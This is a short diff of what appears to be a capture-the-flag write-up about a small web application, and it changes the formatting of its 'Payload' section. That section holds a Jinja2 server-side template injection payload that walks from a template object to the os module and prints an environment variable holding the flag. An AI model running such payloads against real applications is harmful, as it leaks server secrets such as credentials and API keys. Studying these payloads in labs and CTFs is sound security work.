@@ -6,7 +6,7 @@ Lately, a lot of teams have started to use AI. We built a small webapplication t
 ## Analysis
 
 ## Payload
-``` 
+```jinja2
 {% print cycler.__init__.__globals__.os.environ['FLAG'] %}
 ```
 
